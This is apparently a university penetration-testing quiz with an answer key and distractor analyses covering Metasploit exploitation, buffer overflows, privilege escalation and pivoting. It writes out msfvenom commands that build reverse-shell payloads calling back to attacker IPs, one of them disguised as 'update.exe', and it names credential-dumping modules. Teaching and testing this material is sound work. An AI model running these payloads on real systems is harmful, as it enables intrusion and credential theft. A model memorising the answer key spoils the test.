# Quiz: Module 07 — Exploitation Techniques

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

**Instructions:** Select the single best answer for each question. Questions are aligned to CompTIA PenTest+ PT0-002 Domain 3: Attacks and Exploits.

---

### Question 1

A penetration tester wants to verify that a target system is vulnerable to a specific exploit without actually exploiting it. Which Metasploit command accomplishes this?

- A) `run`
- B) `exploit -j`
- C) `check`
- D) `info`

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** The `check` command in msfconsole sends specific probes to the target to determine whether it is vulnerable to the selected exploit, without delivering the payload or establishing a session. Not all modules support `check`, but when available it is a valuable verification step that can be documented in the report.
- **Why A is incorrect:** `run` executes the exploit including payload delivery. If successful it compromises the target.
- **Why B is incorrect:** `exploit -j` runs the exploit as a background job — it still attempts full exploitation.
- **Why D is incorrect:** `info` displays the module's description, options, and metadata. It reads from the local module database and does not contact the target at all.

---

### Question 2

A tester is selecting a Metasploit payload for an engagement. They need the entire payload delivered in a single transfer because the target environment has strict outbound network filtering that may prevent the second-stage download. Which payload type is most appropriate?

- A) Staged payload — `windows/x64/meterpreter/reverse_tcp`
- B) Stageless payload — `windows/x64/meterpreter_reverse_tcp`
- C) Bind payload — `windows/x64/shell/bind_tcp`
- D) Encoder — `x86/shikata_ga_nai`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Stageless payloads (indicated by underscore `_` between the payload type and connection method) contain the complete payload in a single binary with no second-stage download. This is the correct choice when network filtering might block the stage download that staged payloads require.
- **Why A is incorrect:** The staged payload `meterpreter/reverse_tcp` (indicated by slash `/`) requires a two-stage delivery: the initial stager connects back to download the full Meterpreter stage. This would be blocked by the described network filtering.
- **Why C is incorrect:** A bind payload opens a listening port on the target and waits for the attacker to connect inbound. This is unrelated to the staged/stageless decision, and bind payloads face their own firewall challenges for inbound connections.
- **Why D is incorrect:** An encoder is not a payload — it is used to obfuscate payloads to evade detection. Selecting an encoder does not determine whether the payload is staged or stageless.

---

### Question 3

After successful exploitation of a target, a penetration tester has a Meterpreter session. The tester runs `getuid` and receives `Server username: www-data`. What does this indicate and what should the tester's next step be?

- A) The tester has SYSTEM-level access; no further privilege escalation is needed
- B) The tester has access as a low-privileged web server process account; privilege escalation to root or SYSTEM should be attempted next
- C) The session has failed and `www-data` indicates a connection error
- D) The `www-data` account has full administrative access on all Linux systems by default

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `www-data` is the standard low-privilege account used by Apache and Nginx web servers on Linux/Debian systems. It has access only to web server files and directories — far from root. The professional next step is privilege escalation to gain elevated access and fully demonstrate the impact of the vulnerability.
- **Why A is incorrect:** `www-data` is a low-privilege service account, not SYSTEM or root. SYSTEM is the highest Windows privilege; on Linux the equivalent is root (uid=0).
- **Why C is incorrect:** Receiving a username in response to `getuid` confirms a working session. An error would appear as an exception or no response.
- **Why D is incorrect:** `www-data` has intentionally limited permissions scoped to web content directories. It cannot read `/etc/shadow`, escalate privileges, or access most system resources without an additional privilege escalation vulnerability.

---

### Question 4

A penetration tester needs to generate a PHP reverse shell payload that will be uploaded to a vulnerable web application. Which msfvenom command is correct?

- A) `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f raw -o shell.php`
- B) `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.php`
- C) `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.php`
- D) `msfvenom --list payloads LHOST=10.10.10.5 -f php -o shell.php`

**Correct Answer:** A

**Distractor Analysis:**

- **Why A is correct:** This command specifies a PHP payload (`php/meterpreter_reverse_tcp`), the attacker's IP and port, and the output format `raw` — which produces a plain PHP file. The `-o shell.php` names the output file correctly. PHP webshells must use `-f raw` to produce interpretable PHP code.
- **Why B is incorrect:** This specifies a Windows 64-bit EXE payload with `-f exe`. Even named `shell.php`, this would produce a Windows PE binary that would not execute as PHP code.
- **Why C is incorrect:** This generates a Linux ELF binary with `-f elf`. An ELF binary named `.php` would not execute as PHP in a web application context.
- **Why D is incorrect:** `--list payloads` is a listing command for displaying available payloads. Adding connection parameters and output flags to a listing command produces an error, not a payload file.

---

### Question 5

In a stack-based buffer overflow exploitation workflow, what is the purpose of using `msf-pattern_create` and `msf-pattern_offset`?

- A) To generate shellcode that avoids bad characters in the target application's input handling
- B) To create a unique non-repeating pattern that, when placed in EIP after a crash, allows precise calculation of the exact byte offset needed to control the instruction pointer
- C) To automatically identify the JMP ESP gadget address in the target executable's memory
- D) To encode the final shellcode payload to bypass antivirus detection before delivery

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `msf-pattern_create` generates a unique cyclic pattern where every 4-byte subsequence appears only once. When an application crashes and EIP contains part of this pattern, `msf-pattern_offset` takes that 4-byte value and returns the exact byte position — the precise number of bytes needed between the start of the buffer and the EIP overwrite location. This replaces trial-and-error offset finding.
- **Why A is incorrect:** Bad character identification is a separate step performed by sending all byte values (`\x00` through `\xFF`) and observing which cause truncation or corruption in the vulnerable application. Pattern creation and offset tools serve a different purpose.
- **Why C is incorrect:** JMP ESP gadget discovery is performed by tools like `mona.py` in Immunity Debugger or `ROPgadget`. Pattern tools do not locate gadgets.
- **Why D is incorrect:** Shellcode encoding is performed by specifying an encoder with `-e` in msfvenom. Pattern tools have no encoding function.

---

### Question 6

A penetration tester has established a Meterpreter session and wants to run a post-exploitation module to identify potential local privilege escalation paths without manually researching every installed application and service. Which command is most appropriate?

- A) `run post/windows/gather/hashdump`
- B) `run post/multi/recon/local_exploit_suggester`
- C) `run post/windows/manage/enable_rdp`
- D) `run autoroute -s 10.10.10.0/24`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The `local_exploit_suggester` post-exploitation module examines the compromised system's OS version, architecture, installed patches, and running services, then returns a list of Metasploit privilege escalation exploits that are likely applicable. It significantly accelerates the privilege escalation research phase.
- **Why A is incorrect:** `hashdump` extracts local password hashes from the Windows SAM database. It is a credential gathering module, not a privilege escalation suggester. It also typically requires SYSTEM-level access to run.
- **Why C is incorrect:** `enable_rdp` enables Remote Desktop Protocol access on the compromised Windows system. This is a persistence/access mechanism, not a privilege escalation identification tool.
- **Why D is incorrect:** `autoroute` adds routing rules to pivot through the compromised host to reach additional network segments. It is a pivoting tool, not related to privilege escalation.

---

### Question 7

What is the fundamental difference between a Metasploit `exploit` module and an `auxiliary` module?

- A) Exploit modules run only on Windows targets; auxiliary modules run only on Linux targets
- B) Exploit modules deliver a payload to gain code execution; auxiliary modules perform tasks like scanning, brute forcing, or fuzzing without delivering a payload
- C) Auxiliary modules are faster than exploit modules because they do not require network connectivity
- D) Exploit modules can only be used with Meterpreter payloads; auxiliary modules support any payload type

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The defining distinction is payload delivery. An exploit module exploits a vulnerability to deliver and execute a payload, resulting in a session. An auxiliary module performs reconnaissance, testing, or attack tasks — scanning, credential brute forcing, fuzzing, denial-of-service testing — without establishing a persistent session via payload.
- **Why A is incorrect:** Both exploit and auxiliary modules support multiple operating system platforms. The platform compatibility is determined by individual module design, not the module type.
- **Why C is incorrect:** Auxiliary modules absolutely require network connectivity — scanner modules, brute-force modules, and fuzzing modules all send network traffic to targets. Speed differences exist between specific modules but are not a categorical distinction of module type.
- **Why D is incorrect:** Exploit modules support a wide variety of payload types including basic shells, Meterpreter, PowerShell, and others. The available payloads depend on the specific exploit module's compatibility list, not a blanket restriction.

---

### Question 8

Meterpreter is preferred over a basic command shell payload in many penetration tests because of a specific architectural characteristic. What is that characteristic, and why does it matter?

- A) Meterpreter communicates over UDP, making it faster than shell payloads that use TCP
- B) Meterpreter runs entirely in memory without writing files to disk, reducing forensic evidence and evading file-based antivirus detection
- C) Meterpreter encrypts all keystrokes entered on the target system before transmitting them to the attacker
- D) Meterpreter automatically escalates privileges to SYSTEM on Windows when it is first loaded

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Meterpreter operates entirely in memory — injected into a running process and never written to disk as a standalone file. This means file-based antivirus scanners that monitor the filesystem cannot detect it through file scans, and forensic investigators face greater difficulty identifying it in disk evidence. This is a core exam concept about Meterpreter's stealth advantage.
- **Why A is incorrect:** Meterpreter uses TCP by default (and can use HTTPS). The communication protocol choice is configurable but not the architectural characteristic that makes Meterpreter distinctive.
- **Why C is incorrect:** Meterpreter does not encrypt keystrokes for transmission to the attacker. The `keyscan_start/keyscan_dump` Meterpreter commands capture keystrokes, but encryption of those keystrokes is not Meterpreter's defining characteristic.
- **Why D is incorrect:** Meterpreter does not automatically escalate privileges. Privilege escalation can be attempted with the `getsystem` command, which tries several techniques, but success depends on available vulnerabilities and is not automatic or guaranteed.

---

### Question 9

A tester uses the Metasploit `multi/handler` module with a matching payload. What is the purpose of this module?

- A) It automates the selection of the best exploit for a given target based on vulnerability data
- B) It acts as a generic listener that receives connections from payloads delivered through other means (msfvenom-generated files, manual exploitation)
- C) It handles multiple simultaneous exploit attempts against different targets
- D) It converts Meterpreter sessions into standard command shells for compatibility with post-exploitation tools

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `exploit/multi/handler` is a listener — it waits for incoming connections from previously deployed payloads. When a tester generates a payload with msfvenom and delivers it through a web upload, email attachment, or USB, the `multi/handler` with the matching payload configuration catches the incoming connection and establishes the Meterpreter or shell session.
- **Why A is incorrect:** Automated exploit selection based on vulnerability data is not a Metasploit feature built into `multi/handler`. This is more characteristic of commercial scanners or the `db_autopwn` plugin (which is no longer included by default).
- **Why C is incorrect:** While `multi/handler` can be run as a background job to handle multiple incoming connections, its purpose is not simultaneous exploit management — it is a passive listener waiting for payload connections.
- **Why D is incorrect:** `multi/handler` does not perform session type conversion. Session upgrading from shell to Meterpreter is done through `sessions -u [id]` which uses a separate upgrade module.

---

### Question 10

During a penetration test, a tester discovers a buffer overflow vulnerability in a custom application. The tester generates a 2000-byte pattern with `msf-pattern_create -l 2000`, crashes the application, and observes that EIP contains the value `0x41326641`. The tester then runs `msf-pattern_offset -q 0x41326641` and receives the result `[*] Exact match at offset 524`. What does offset 524 mean in the context of exploiting this vulnerability?

- A) The application has 524 total bytes of memory allocated for user input
- B) The exploit payload must be exactly 524 bytes long to succeed
- C) The first 524 bytes of the input fill the buffer and saved base pointer before reaching the saved return address (EIP); bytes 525–528 overwrite EIP
- D) The JMP ESP instruction is located at memory address 0x00000524 in the application

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** An offset of 524 means that the unique 4-byte pattern that landed in EIP begins at byte position 524 of the input. The correct exploit structure is: 524 bytes of padding (As), followed by the 4-byte address to place in EIP (the JMP ESP or ROP gadget address), followed by any additional instructions or shellcode. Bytes 525–528 directly overwrite the saved return address.
- **Why A is incorrect:** The offset is the distance to EIP within the exploit buffer, not the total memory allocation. The total buffer allocation is determined by the application's code and may be smaller than 524 bytes — overflow occurs precisely because input exceeds the buffer.
- **Why B is incorrect:** The total exploit payload is significantly longer than 524 bytes. After the 524-byte padding and 4-byte EIP overwrite, additional shellcode (typically 100–500+ bytes) is appended.
- **Why D is incorrect:** The offset value from `msf-pattern_offset` is a byte count within the input pattern. JMP ESP gadget addresses are found separately using debugger tools like mona.py or ROPgadget and are actual memory addresses in the target process space.

---

---

### Question 11

A tester runs `use auxiliary/scanner/portscan/tcp` in Metasploit and sets `RHOSTS 192.168.1.0/24`. What type of Metasploit module is this, and how does it differ from an exploit module?

- A) It is a payload module; payload modules deliver shellcode independently without requiring an exploit
- B) It is an auxiliary module; auxiliary modules perform supporting tasks (scanning, enumeration, fuzzing, credential testing) that do not deliver a payload or open a session
- C) It is a post module; post modules require an existing session and this is how Metasploit performs reconnaissance after exploitation
- D) It is an encoder module; encoder modules modify scan traffic to evade intrusion detection systems

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Auxiliary modules in Metasploit perform non-exploitation tasks — scanning, enumeration, fuzzing, denial of service tests, and credential testing — without establishing a session. They do not deliver payloads. The `scanner/portscan/tcp` module specifically conducts TCP port scanning from within the Metasploit framework.
- **Why A is incorrect:** Payload modules contain shellcode that executes on a compromised target. They are delivered through exploit modules and cannot run independently as scanners.
- **Why C is incorrect:** Post modules require an existing active session and are used for post-exploitation tasks (privilege escalation, data gathering, persistence). They cannot run without a prior successful exploitation.
- **Why D is incorrect:** Encoder modules modify payload bytecode to evade signature-based detection. They are used during payload generation (msfvenom), not as standalone network scanners.

---

### Question 12

What is the functional difference between `windows/meterpreter/reverse_tcp` (staged) and `windows/meterpreter_reverse_tcp` (stageless)?

- A) Staged payloads only work on Windows 7; stageless payloads work on all Windows versions
- B) A staged payload sends a small initial stager that downloads the full Meterpreter DLL from the handler at runtime; a stageless payload contains the complete Meterpreter code in a single self-contained binary
- C) Staged payloads require SMB to deliver the second stage; stageless payloads use HTTP for delivery
- D) Stageless payloads are smaller than staged payloads because they do not include the Meterpreter DLL

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The `/` in the module path (e.g., `meterpreter/reverse_tcp`) indicates a staged payload — a two-step process where a small stager connects back, receives the Meterpreter DLL (stage 2) from the handler, and executes it in memory. The `_` version (e.g., `meterpreter_reverse_tcp`) is stageless — all Meterpreter code is embedded in the initial executable. Stageless payloads are larger but work in environments where a secondary download is blocked.
- **Why A is incorrect:** Both staged and stageless payloads support the same range of Windows versions. Compatibility is not determined by staging type.
- **Why C is incorrect:** The delivery protocol for the second stage is configured by the handler's `LURI` and transport settings, not inherent to the staged/stageless distinction. Both can use TCP, HTTP, or HTTPS for the callback.
- **Why D is incorrect:** Stageless payloads are actually larger because they contain the complete Meterpreter code. Staged payloads are smaller initially because they only contain the stager.

---

### Question 13

After gaining a Meterpreter session, a tester runs `getsystem` and receives `[-] priv_elevate_getsystem: Operation failed: Access is denied.` What does this indicate and what is the appropriate next step?

- A) The target system is fully patched and privilege escalation is impossible; the tester should abandon this session
- B) The current session does not have the necessary privileges to use the built-in Metasploit privilege escalation techniques; the tester should enumerate the system for local privilege escalation paths using post modules or manual techniques before retrying
- C) The Meterpreter session has been detected by antivirus and must be re-established before any commands work
- D) `getsystem` only works against Linux targets; Windows privilege escalation requires a separate module

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `getsystem` attempts several techniques (named pipe impersonation, token duplication, service creation) to elevate from a standard user to SYSTEM. Failure means the current user context lacks privileges to execute those techniques, not that escalation is impossible. The next step is to enumerate local privilege escalation opportunities: unquoted service paths, misconfigured service permissions, kernel exploits, or DLL hijacking opportunities — using modules like `local_exploit_suggester`.
- **Why A is incorrect:** A single failed `getsystem` attempt does not mean the system is unescalable. Many privilege escalation paths exist beyond the techniques `getsystem` uses.
- **Why C is incorrect:** Antivirus detection typically terminates the session entirely rather than causing individual commands to return access-denied errors. The error message is a permissions issue, not an AV indicator.
- **Why D is incorrect:** `getsystem` works against Windows targets specifically. It is not applicable to Linux, where privilege escalation uses entirely different techniques.

---

### Question 14

A tester generates a payload with: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.50 LPORT=443 -f exe -o update.exe`. Why is port 443 and HTTPS used rather than a common high-number port?

- A) Meterpreter only supports HTTPS on port 443 due to TLS certificate requirements
- B) Port 443 (HTTPS) is commonly allowed outbound through corporate firewalls and blends with normal web traffic, making the callback less likely to be blocked or flagged by network monitoring
- C) Using port 443 bypasses Windows Defender automatically because security software cannot scan encrypted traffic
- D) LPORT 443 is required when using 64-bit payloads; 32-bit payloads use port 80

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Port 443 outbound is permitted in virtually every corporate environment for HTTPS web browsing. A Meterpreter callback on port 443 using TLS encryption blends with normal user web traffic, making it harder for perimeter firewalls and network-based IDS to distinguish from legitimate HTTPS connections. This is a standard operational security (OPSEC) consideration in payload design.
- **Why A is incorrect:** Meterpreter HTTPS callbacks can use any port. The LPORT parameter is configurable. The TLS certificate is generated dynamically by the Metasploit handler.
- **Why C is incorrect:** Modern endpoint detection and response (EDR) products can inspect encrypted traffic via SSL inspection, and Windows Defender detects Meterpreter via behavioral and signature analysis — encrypted transport does not provide automatic AV bypass.
- **Why D is incorrect:** The LPORT value has no relationship to the payload architecture (32-bit vs. 64-bit). Architecture is specified in the payload name (`windows/x64/` vs. `windows/`).

---

### Question 15

During exploitation of vsftpd 2.3.4 using Metasploit's `unix/ftp/vsftpd_234_backdoor`, the tester sets RHOSTS and runs the exploit but receives `[-] Exploit failed [unreachable]: Rex::ConnectionRefused Connect refused`. What is the most likely cause?

- A) The vsftpd backdoor was already triggered by another attacker and is no longer active
- B) The target FTP service is not running, the port is firewalled, the IP address is wrong, or the target has been patched — the handler cannot reach the service to trigger the backdoor
- C) The exploit module is incompatible with the current Metasploit version and must be updated
- D) vsftpd 2.3.4 backdoor requires a specific command to be sent before the exploit module can connect

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `ConnectionRefused` means the TCP connection to RPORT (default 21) was refused by the target. This happens when: the service is not running, a host-based firewall blocks the port, the RHOSTS IP is incorrect, or the target is not reachable. The first diagnostic step is to confirm FTP is accessible: `nmap -p 21 TARGET_IP`.
- **Why A is incorrect:** The vsftpd backdoor listens on port 6200 after being triggered, but the initial connection for triggering goes to port 21. A previously triggered backdoor would not cause a connection refused on port 21 unless the service itself is also down.
- **Why C is incorrect:** `ConnectionRefused` is a network connectivity error, not a module compatibility error. Module compatibility issues produce different error types (module load errors, option validation failures).
- **Why D is incorrect:** The vsftpd backdoor is triggered by sending a username containing `:)` (smiley face) over FTP — the Metasploit module handles this automatically. No manual pre-trigger is required.

---

### Question 16

A tester has a Meterpreter session and wants to pivot to a network segment that is unreachable from the attacker machine but accessible from the compromised host. Which Metasploit command sequence enables this?

- A) `run post/multi/manage/shell_to_meterpreter` to convert the session, then `sessions -l` to list available routes
- B) `run post/multi/manage/autoroute` or `route add SUBNET NETMASK SESSION_ID` to add a route through the compromised host's session, then use `auxiliary/server/socks_proxy` to proxy tools through the pivot
- C) `set LHOST` to the target subnet IP and re-run the exploit — Metasploit automatically routes through existing sessions
- D) `getsystem` then `run post/windows/gather/enum_routes` to enumerate and automatically add all pivot routes

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Post-exploitation pivoting requires explicitly adding a route through the compromised host's session so Metasploit knows to forward traffic through that session to reach the target subnet. `autoroute` automates this. Combining it with a SOCKS proxy allows external tools (Nmap, web browsers) to route traffic through the pivot using `proxychains`.
- **Why A is incorrect:** `shell_to_meterpreter` upgrades a command shell session to Meterpreter — it does not configure network routing. Listing sessions shows active sessions but does not add pivot routes.
- **Why C is incorrect:** Changing LHOST does not configure routing. Metasploit does not automatically route through existing sessions — routing must be explicitly configured.
- **Why D is incorrect:** `enum_routes` enumerates the routing table on the compromised host for intelligence purposes but does not automatically configure Metasploit pivoting routes.

---

### Question 17

What is a NOP sled in the context of a buffer overflow exploit, and why is it used?

- A) A NOP sled is a sequence of `0x90` (No Operation) instructions prepended before shellcode; it increases the probability of successful execution by providing a landing zone — if EIP jumps anywhere into the NOP sled, execution slides down to the shellcode
- B) A NOP sled is a series of repeated JMP instructions that redirect execution across multiple memory pages to evade stack canaries
- C) A NOP sled is the padding bytes (As) placed before the EIP overwrite to fill the buffer up to the return address offset
- D) A NOP sled is an Metasploit encoder that replaces null bytes in shellcode with NOP equivalents to ensure clean memory delivery

**Correct Answer:** A

**Distractor Analysis:**

- **Why A is correct:** NOP (`0x90`) instructions perform no operation and simply advance the instruction pointer to the next byte. Prepending 100–200 NOPs before the shellcode creates a landing zone: if memory addresses vary slightly (due to environment variables, stack alignment), the exploit still succeeds as long as EIP lands anywhere in the sled. Execution slides through the NOPs until it reaches the shellcode.
- **Why B is incorrect:** NOP sleds do not redirect execution across pages and have no direct relationship to stack canary evasion. Stack canaries require different bypass techniques (overwriting the canary with its known value or using format string vulnerabilities).
- **Why C is incorrect:** The padding bytes that fill the buffer to the EIP offset are typically repeated `\x41` (A) characters — these are not NOP sleds. The NOP sled is placed after the EIP overwrite address, between EIP and the shellcode.
- **Why D is incorrect:** Null byte removal is performed by Metasploit encoders (e.g., `x86/shikata_ga_nai`), not by NOP sleds. These are separate techniques addressing different problems.

---

### Question 18

A tester successfully exploits a vulnerability and runs `getuid` in Meterpreter, receiving `NT AUTHORITY\NETWORK SERVICE`. What does this indicate about the current access level and what is required to achieve full system compromise?

- A) `NETWORK SERVICE` is a SYSTEM-level account; the tester already has full administrative control of the host
- B) `NETWORK SERVICE` is a limited built-in Windows account with network access but restricted local privileges; privilege escalation to `NT AUTHORITY\SYSTEM` or a local administrator account is required for full system control
- C) `NETWORK SERVICE` confirms the tester has domain administrator access because it is a domain service account
- D) `NETWORK SERVICE` means the tester has read-only access; write operations require re-exploiting with a different payload

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `NT AUTHORITY\NETWORK SERVICE` is a built-in Windows low-privilege service account used for services that need to access network resources. It has limited local privileges — it cannot access most system files, cannot install software, and cannot read sensitive registry hives or other users' data. Escalating to `NT AUTHORITY\SYSTEM` (the highest local Windows privilege level) is required for activities like dumping password hashes, reading all files, or manipulating system services.
- **Why A is incorrect:** `NETWORK SERVICE` is explicitly not a SYSTEM-level account. It is deliberately limited so that compromised services have minimal impact.
- **Why C is incorrect:** `NETWORK SERVICE` is a local built-in account, not a domain account. It has no inherent domain privileges and does not indicate domain administrator access.
- **Why D is incorrect:** `NETWORK SERVICE` is not read-only. The account can perform various operations within its privilege scope. The limitation is on elevation-required operations, not all write operations.

---

### Question 19

After gaining SYSTEM-level access on a Windows target through Metasploit, the tester runs `run post/windows/gather/hashdump`. What does this module do and what risk must the tester consider?

- A) It enumerates network interfaces and saves them to a file; the risk is that it generates heavy network traffic
- B) It extracts NTLM password hashes from the SAM database; the tester must ensure this activity is authorized in the RoE because hash extraction may constitute accessing credential data beyond what is needed to demonstrate the vulnerability
- C) It dumps all files from the C:\ drive for offline analysis; the risk is excessive disk usage on the attacker machine
- D) It scans for additional vulnerable services on the compromised host; the risk is triggering IDS alerts from internal scanning

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `hashdump` reads the SAM (Security Account Manager) database and extracts NTLM password hashes for all local accounts. These hashes can be cracked offline or used directly in pass-the-hash attacks. Because credential hashes are sensitive data, the RoE must explicitly authorize credential extraction. Many engagement contracts distinguish between "demonstrate SYSTEM access" and "extract/crack credentials" — these may require different authorization levels.
- **Why A is incorrect:** Network interface enumeration is performed by modules like `arp_scanner` or `ifconfig`. `hashdump` specifically targets the Windows credential store.
- **Why C is incorrect:** `hashdump` extracts only the credential database (SAM), not all files from C:\. The output is compact (a few KB of hashes) rather than the entire drive.
- **Why D is incorrect:** `hashdump` reads local system files — it does not perform network scanning and does not generate network traffic that would trigger IDS alerts.

---

### Question 20

The RoE for an engagement specifies "no persistence mechanisms are to be installed on any client system." During post-exploitation, a Metasploit module prompts the tester to "set up persistence for reliable re-access." What is the correct action?

- A) Install persistence only on the highest-value target to minimize footprint while maintaining access
- B) Decline to install persistence, document the point in the engagement where persistence could have been installed as a finding, and continue post-exploitation within the authorized scope
- C) Install persistence but disable it immediately after the engagement ends to comply with the RoE
- D) Request verbal permission from the client's IT contact to install persistence, then proceed if they agree

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** RoE restrictions are legally binding. Installing persistence when it is explicitly prohibited — even on a single host or "temporarily" — violates the engagement contract and potentially the CFAA. The professional response is to document that persistence installation would have been possible (demonstrating the risk) without actually installing it, then continue working within authorized bounds.
- **Why A is incorrect:** The RoE says "no persistence on any system." Installing on any system, even one, violates the explicit prohibition. Scope restrictions are not subject to tester judgment about which violations are acceptable.
- **Why C is incorrect:** Installing persistence and then removing it still violated the RoE at the moment of installation. Additionally, "removal" of persistence mechanisms is never guaranteed to be complete, and any failure leaves artifacts on client systems without authorization.
- **Why D is incorrect:** Verbal permission does not modify a written RoE. Any scope changes require written approval from the authorized point of contact. Acting on verbal permission exposes the tester to legal risk if the verbal authorizer lacked authority to grant it or later denies the conversation.

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
